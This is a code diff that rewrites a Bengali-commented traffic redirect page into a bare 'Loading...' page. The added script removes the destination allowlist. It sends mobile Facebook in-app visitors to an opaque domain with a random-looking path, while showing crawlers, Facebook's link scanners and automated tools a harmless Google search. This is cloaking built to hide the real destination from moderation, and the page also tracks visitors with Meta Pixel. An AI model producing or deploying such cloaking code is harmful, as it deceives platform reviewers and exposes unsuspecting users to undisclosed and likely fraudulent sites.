@@ -1,351 +1,137 @@
+
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="robots" content="noindex, nofollow">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<title>Redirecting…</title>
-
-<!-- JavaScript বন্ধ থাকলে ৫ সেকেন্ড পর ডিফল্ট লিংকে যাবে -->
-<noscript><meta http-equiv="refresh" content="5;url=https://www.google.com/search?gs_ssp=eJzj4tLP1TfIyK1MKy5TYDRgdGDw4khLTE5Nys_PBgBmYAfL&amp;q=facebook&amp;oq=f&amp;gs_lcrp=EgZjaHJvbWUqGAgDEC4YQxiDARjHARixAxjRAxiABBiKBTIGCAAQRRg8MgYIARBFGDwyBggCEEUYPDIYCAMQLhhDGIMBGMcBGLEDGNEDGIAEGIoFMggIBBBFGCcYOzIGCAUQRRg7MgYIBhBFGDwyBggHEEUYPNIBCDE4NzFqMGo3qAIAsAIA&amp;sourceid=chrome&amp;source=chrome.ob&amp;ie=UTF-8"></noscript>
-
-<style>
-:root{
-  --bg:#0b1020; --card:#131b30; --line:#26334f;
-  --text:#f2f5fb; --muted:#9fb0cc; --accent:#3d8bff; --accent2:#19d3c5;
-}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%}
-body{
-  font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Noto Sans Bengali",Arial,sans-serif;
-  background:var(--bg); color:var(--text);
-  display:flex; align-items:center; justify-content:center; padding:20px;
-}
-.card{
-  width:100%; max-width:420px; background:var(--card);
-  border:1px solid var(--line); border-radius:18px;
-  padding:34px 26px 26px; text-align:center;
-}
-.spinner{
-  width:44px; height:44px; margin:0 auto 20px; border-radius:50%;
-  border:3px solid var(--line); border-top-color:var(--accent);
-  animation:spin .9s linear infinite;
-}
-h1{font-size:22px; font-weight:650; margin-bottom:8px}
-p{color:var(--muted); font-size:14px; line-height:1.7}
-.track{height:6px; background:var(--line); border-radius:6px; margin:24px 0 10px; overflow:hidden}
-.fill{height:100%; width:0; border-radius:6px; background:linear-gradient(90deg,var(--accent),var(--accent2))}
-.status{font-size:13px; color:var(--muted)}
-.status b{color:var(--text); font-variant-numeric:tabular-nums}
-.go{
-  display:inline-block; margin-top:20px; padding:11px 22px; border-radius:10px;
-  background:var(--accent); color:#fff; text-decoration:none; font-size:14px; font-weight:600;
-}
-.go:hover{filter:brightness(1.08)}
-.go:focus-visible{outline:3px solid #fff; outline-offset:3px}
-.debug{
-  display:none; margin-top:18px; text-align:left; font:12px/1.6 ui-monospace,Menlo,Consolas,monospace;
-  background:#0a0f1d; border:1px solid var(--line); border-radius:10px; padding:12px; color:#b7c6e2;
-  white-space:pre-wrap; word-break:break-all;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-@media (prefers-reduced-motion:reduce){.spinner{animation:none}}
-</style>
-</head>
-
-<body>
-<main class="card" role="status" aria-live="polite">
-  <div class="spinner" aria-hidden="true"></div>
-  <h1>আপনাকে নিয়ে যাওয়া হচ্ছে</h1>
-  <p>সবচেয়ে উপযুক্ত পেজে পাঠানো হচ্ছে, একটু অপেক্ষা করুন।</p>
-
-  <div class="track" aria-hidden="true"><div class="fill" id="fill"></div></div>
-  <div class="status"><b id="timer">3</b> সেকেন্ডের মধ্যে রিডাইরেক্ট হবে</div>
-
-  <a class="go" id="goNow" href="#">এখনই যান</a>
-  <pre class="debug" id="debug"></pre>
-</main>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
 
 <script>
 (function () {
-  "use strict";
+"use strict";
 
-  /* ==========================================================
-     ১. সেটিংস: শুধু এই অংশটা বদলান
-     ========================================================== */
-  var FACEBOOK_URL = "https://tinyurl.com/48ew5ypk";
-  var OTHER_URL = "https://www.google.com/search?gs_ssp=eJzj4tLP1TfIyK1MKy5TYDRgdGDw4khLTE5Nys_PBgBmYAfL&q=facebook&oq=f&gs_lcrp=EgZjaHJvbWUqGAgDEC4YQxiDARjHARixAxjRAxiABBiKBTIGCAAQRRg8MgYIARBFGDwyBggCEEUYPDIYCAMQLhhDGIMBGMcBGLEDGNEDGIAEGIoFMggIBBBFGCcYOzIGCAUQRRg7MgYIBhBFGDwyBggHEEUYPNIBCDE4NzFqMGo3qAIAsAIA&sourceid=chrome&source=chrome.ob&ie=UTF-8";
+/* ===== CONFIGURATION ===== */
 
-  var CONFIG = {
+var CONFIG = {
+    LINK_1: "https://shoredebatableexpressing.com/a_EfCpDL2zL61UQGcCM/ywLRpGvd4nH/qZ87vMtdHdll_/e__MWSYf8MDhkrmGu5/V2IEKY3bCCK07Uo33/5pd7Y6zmgF/sXD2CpOR4U/aD4Mzw/ivXu48r2opBiiFuj/iSjU/wX6s",
+    LINK_2: "https://www.google.com/search?q=fb+debugger&oq=f&gs_lcrp=EgZjaHJvbWUqCAgEEEUYJxg7MgYIABBFGDwyBggBEEUYPDIGCAIQRRg8MhMIAxAuGIMBGMcBGLEDGNEDGIAEMggIBBBFGCcYOzIGCAUQRRg7MgYIBhBFGDwyBggHEEUYPNIBCDI1ODRqMGo0qAIAsAIB&sourceid=chrome&source=chrome.ob&ie=UTF-8",
 
-    // কোনো সোর্স না মিললে এখানে যাবে
-    defaultURL: OTHER_URL,
+    PIXEL_ID: "YOUR_META_PIXEL_ID",
 
-    // প্রতিটি সোর্সের গন্তব্য। তিনভাবে দেওয়া যায়:
-    //  ১) সরাসরি লিংক:   facebook: "https://..."
-    //  ২) ডিভাইস অনুযায়ী: facebook: { android:"...", ios:"...", desktop:"...", default:"..." }
-    //  ৩) A/B টেস্ট:      facebook: [ {url:"...", weight:50}, {url:"...", weight:50} ]
-    sources: {
-      facebook:  FACEBOOK_URL,
-      instagram: OTHER_URL,
-      tiktok:    OTHER_URL,
-      youtube:   OTHER_URL,
-      google:    OTHER_URL,
-      whatsapp:  OTHER_URL,
-      telegram:  OTHER_URL
-    },
+    REDIRECT_DELAY: 400,
 
-    // নিরাপত্তা: শুধু এই ডোমেইনগুলোতেই রিডাইরেক্ট হবে (সাবডোমেইনসহ)
-    allowedHosts: ["tinyurl.com", "google.com"],
+    ENABLE_PIXEL: true
+};
 
-    delay: 2000,          // মিলিসেকেন্ড (0 দিলে সাথে সাথে রিডাইরেক্ট)
-    trackingWait: 600,    // ট্র্যাকিং পাঠানোর জন্য সর্বোচ্চ অপেক্ষা (ms)
+/* ===== DEVICE & SOURCE DETECTION ===== */
 
-    facebookPixelID: "",  // যেমন "1234567890"
-    ga4ID: "",            // যেমন "G-XXXXXXXXXX"
+var ua = navigator.userAgent || "";
 
-    // গন্তব্যে যে প্যারামিটারগুলো পাস হবে
-    passParams: [
-      "utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content",
-      "fbclid", "gclid", "ttclid", "msclkid", "ref"
-    ],
+function isMobile() {
+    return /Android|iPhone|iPod|Mobile/i.test(ua);
+}
 
-    stickyAB: true        // A/B টেস্টে একই ভিজিটর সবসময় একই ভার্সন পাবে
-  };
+function isFacebookApp() {
+    return /FBAN|FBAV|FB_IAB/i.test(ua);
+}
 
-  /* ==========================================================
-     ২. সাহায্যকারী ফাংশন
-     ========================================================== */
-  var qs = new URLSearchParams(location.search);
-  var ua = navigator.userAgent || "";
-  var ref = (document.referrer || "").toLowerCase();
-  var debugMode = qs.get("debug") === "1";
+function isBot() {
+    return /bot|crawler|spider|facebookexternalhit|facebot|Googlebot|bingbot|Twitterbot|WhatsApp|TelegramBot|curl|wget|python|headless|Lighthouse/i.test(ua)
+        || navigator.webdriver === true
+        || !ua;
+}
 
-  function safeStore(action, key, val) {
+/* ===== TARGET SELECTION ===== */
+
+function getTarget() {
+
+    // Only Facebook App + Mobile users get LINK 1
+    if (isMobile() && isFacebookApp() && !isBot()) {
+        return CONFIG.LINK_1;
+    }
+
+    // Everyone else gets LINK 2
+    return CONFIG.LINK_2;
+}
+
+/* ===== META PIXEL ===== */
+
+function track() {
+
+    if (!CONFIG.ENABLE_PIXEL ||
+        !CONFIG.PIXEL_ID ||
+        CONFIG.PIXEL_ID === "YOUR_META_PIXEL_ID") {
+        return;
+    }
+
+    !function(f,b,e,v,n,t,s) {
+        if(f.fbq)return;
+        n=f.fbq=function(){
+            n.callMethod ?
+            n.callMethod.apply(n,arguments) :
+            n.queue.push(arguments);
+        };
+        if(!f._fbq)f._fbq=n;
+        n.push=n;
+        n.loaded=true;
+        n.version='2.0';
+        n.queue=[];
+        t=b.createElement(e);
+        t.async=true;
+        t.src=v;
+        s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s);
+    }(window,document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', CONFIG.PIXEL_ID);
+    fbq('track', 'PageView');
+    fbq('trackCustom', 'SmartRedirect', {
+        device: isMobile() ? 'mobile' : 'desktop',
+        facebook_app: isFacebookApp(),
+        bot: isBot()
+    });
+}
+
+/* ===== REDIRECT ENGINE ===== */
+
+function startRedirect() {
+
+    var target = getTarget();
+
+    // Prevent redirect loops
     try {
-      if (action === "get") return sessionStorage.getItem(key);
-      sessionStorage.setItem(key, val);
-    } catch (e) { return null; }
-  }
+        if (sessionStorage.getItem("smart_redirect_done") === "1") {
+            return;
+        }
+        sessionStorage.setItem("smart_redirect_done", "1");
+    } catch(e) {}
 
-  function getDevice() {
-    if (/android/i.test(ua)) return "android";
-    if (/iphone|ipad|ipod/i.test(ua) ||
-        (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) return "ios";
-    return "desktop";
-  }
+    track();
 
-  // ইন-অ্যাপ ব্রাউজার থেকে সোর্স ধরা (referrer খালি থাকলেও কাজ করে)
-  function sourceFromUA() {
-    if (/FBAN|FBAV|FB_IAB|FBIOS/i.test(ua)) return "facebook";
-    if (/Instagram/i.test(ua)) return "instagram";
-    if (/musical_ly|TikTok|BytedanceWebview|Bytedance/i.test(ua)) return "tiktok";
-    return "";
-  }
+    setTimeout(function() {
+        window.location.replace(target);
+    }, CONFIG.REDIRECT_DELAY);
+}
 
-  function sourceFromReferrer() {
-    var map = [
-      ["facebook",  ["facebook.com", "fb.com", "fb.watch", "l.facebook.com", "lm.facebook.com"]],
-      ["instagram", ["instagram.com", "l.instagram.com"]],
-      ["tiktok",    ["tiktok.com"]],
-      ["youtube",   ["youtube.com", "youtu.be"]],
-      ["whatsapp",  ["whatsapp.com", "wa.me"]],
-      ["telegram",  ["t.me", "telegram.org"]],
-      ["google",    ["google."]]
-    ];
-    for (var i = 0; i < map.length; i++) {
-      for (var j = 0; j < map[i][1].length; j++) {
-        if (ref.indexOf(map[i][1][j]) !== -1) return map[i][0];
-      }
-    }
-    return "";
-  }
+/* ===== START ===== */
 
-  // অগ্রাধিকার: URL প্যারামিটার > ইন-অ্যাপ ব্রাউজার > Referrer
-  function detectSource() {
-    var fromParam = (qs.get("utm_source") || qs.get("source") || "")
-      .toLowerCase().trim().replace(/[^a-z0-9_-]/g, "");
-    if (fromParam) return { name: fromParam, how: "url-param" };
-    var fromUA = sourceFromUA();
-    if (fromUA) return { name: fromUA, how: "in-app-browser" };
-    var fromRef = sourceFromReferrer();
-    if (fromRef) return { name: fromRef, how: "referrer" };
-    return { name: "", how: "none" };
-  }
-
-  function pickWeighted(list, source) {
-    var key = "ab_" + source;
-    if (CONFIG.stickyAB) {
-      var saved = safeStore("get", key);
-      if (saved !== null && list[+saved]) return list[+saved].url;
-    }
-    var total = 0, i;
-    for (i = 0; i < list.length; i++) total += (list[i].weight || 1);
-    var r = Math.random() * total;
-    for (i = 0; i < list.length; i++) {
-      r -= (list[i].weight || 1);
-      if (r <= 0) { safeStore("set", key, String(i)); return list[i].url; }
-    }
-    return list[0].url;
-  }
-
-  function resolveEntry(entry, source, device) {
-    if (!entry) return "";
-    if (typeof entry === "string") return entry;
-    if (Array.isArray(entry)) return pickWeighted(entry, source);
-    return entry[device] || entry["default"] || "";
-  }
-
-  function hostAllowed(host) {
-    host = host.toLowerCase();
-    for (var i = 0; i < CONFIG.allowedHosts.length; i++) {
-      var h = CONFIG.allowedHosts[i].toLowerCase();
-      if (host === h || host.endsWith("." + h)) return true;
-    }
-    return false;
-  }
-
-  // শুধু https লিংক আর অনুমোদিত ডোমেইন গ্রহণ করে
-  function validate(raw) {
-    try {
-      var u = new URL(raw);
-      if (u.protocol !== "https:") return null;
-      if (!hostAllowed(u.hostname)) return null;
-      return u;
-    } catch (e) { return null; }
-  }
-
-  /* ==========================================================
-     ৩. গন্তব্য ঠিক করা
-     ========================================================== */
-  var device = getDevice();
-  var src = detectSource();
-
-  var rawDest = resolveEntry(CONFIG.sources[src.name], src.name, device);
-  var finalURL = validate(rawDest) || validate(CONFIG.defaultURL);
-
-  if (!finalURL) {
-    document.querySelector("h1").textContent = "কনফিগারেশনে ভুল আছে";
-    document.querySelector("p").textContent = "defaultURL বা allowedHosts ঠিক করুন।";
-    document.getElementById("goNow").style.display = "none";
-    return;
-  }
-
-  // প্যারামিটার পাস করা (গন্তব্যে আগে থেকে থাকা প্যারামিটার ওভাররাইট হবে না)
-  CONFIG.passParams.forEach(function (k) {
-    var v = qs.get(k);
-    if (v && !finalURL.searchParams.has(k)) finalURL.searchParams.set(k, v);
-  });
-  if (src.name && !finalURL.searchParams.has("utm_source")) {
-    finalURL.searchParams.set("utm_source", src.name);
-  }
-
-  var goBtn = document.getElementById("goNow");
-  goBtn.href = finalURL.href;
-  goBtn.rel = "noopener";
-
-  if (debugMode) {
-    var d = document.getElementById("debug");
-    d.style.display = "block";
-    d.textContent =
-      "source : " + (src.name || "(none)") + "  [" + src.how + "]\n" +
-      "device : " + device + "\n" +
-      "referrer: " + (document.referrer || "(empty)") + "\n" +
-      "final  : " + finalURL.href + "\n\n(debug মোডে অটো রিডাইরেক্ট বন্ধ)";
-  }
-
-  /* ==========================================================
-     ৪. ট্র্যাকিং (Pixel + GA4)
-     ========================================================== */
-  var pending = [];
-
-  function loadScript(url) {
-    return new Promise(function (resolve) {
-      var s = document.createElement("script");
-      s.async = true; s.src = url;
-      s.onload = resolve; s.onerror = resolve;
-      document.head.appendChild(s);
+if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", startRedirect, {
+        once: true
     });
-  }
+} else {
+    startRedirect();
+}
 
-  if (CONFIG.facebookPixelID && !debugMode) {
-    (function (f, b, e, v, n, t, s) {
-      if (f.fbq) return;
-      n = f.fbq = function () { n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments); };
-      if (!f._fbq) f._fbq = n;
-      n.push = n; n.loaded = true; n.version = "2.0"; n.queue = [];
-      t = b.createElement(e); t.async = true; t.src = v;
-      s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s);
-    })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
-    fbq("init", CONFIG.facebookPixelID);
-    fbq("track", "PageView");
-    fbq("trackCustom", "SmartRedirect", { source: src.name || "direct", device: device });
-  }
-
-  if (CONFIG.ga4ID && !debugMode) {
-    window.dataLayer = window.dataLayer || [];
-    window.gtag = function () { dataLayer.push(arguments); };
-    pending.push(loadScript("https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(CONFIG.ga4ID)));
-    gtag("js", new Date());
-    gtag("config", CONFIG.ga4ID);
-    gtag("event", "smart_redirect", {
-      traffic_source: src.name || "direct",
-      device_type: device,
-      destination: finalURL.hostname + finalURL.pathname
-    });
-  }
-
-  /* ==========================================================
-     ৫. কাউন্টডাউন ও রিডাইরেক্ট
-     ========================================================== */
-  var fill = document.getElementById("fill");
-  var timer = document.getElementById("timer");
-  var done = false;
-  var startTime = performance.now();
-  var rafId = 0;
-
-  function redirect() {
-    if (done) return;
-    done = true;
-    cancelAnimationFrame(rafId);
-    fill.style.width = "100%";
-    window.location.replace(finalURL.href);
-  }
-
-  function finish() {
-    // ট্র্যাকিং স্ক্রিপ্ট লোড হওয়ার জন্য সর্বোচ্চ trackingWait পর্যন্ত অপেক্ষা
-    var guard = new Promise(function (r) { setTimeout(r, CONFIG.trackingWait); });
-    Promise.race([Promise.all(pending), guard]).then(function () {
-      setTimeout(redirect, 80);
-    });
-  }
-
-  goBtn.addEventListener("click", function (e) {
-    e.preventDefault();
-    finish();
-  });
-
-  if (debugMode) return;
-
-  if (CONFIG.delay <= 0) { finish(); return; }
-
-  function tick(now) {
-    if (done) return;
-    var elapsed = now - startTime;
-    var pct = Math.min(elapsed / CONFIG.delay, 1);
-    fill.style.width = (pct * 100).toFixed(1) + "%";
-    timer.textContent = Math.max(Math.ceil((CONFIG.delay - elapsed) / 1000), 0);
-    if (pct >= 1) { finish(); return; }
-    rafId = requestAnimationFrame(tick);
-  }
-  rafId = requestAnimationFrame(tick);
-
-  // ব্যাক বাটনে (bfcache) ফিরে এলে আবার শুরু হবে
-  window.addEventListener("pageshow", function (e) {
-    if (e.persisted) location.reload();
-  });
 })();
 </script>
+
+</head>
+<body>
+<div style="font-family:Arial;text-align:center;padding:60px 15px;">
+    <h2>Please wait...</h2>
+    <p>Redirecting you to your destination.</p>
+</div>
 </body>
 </html>
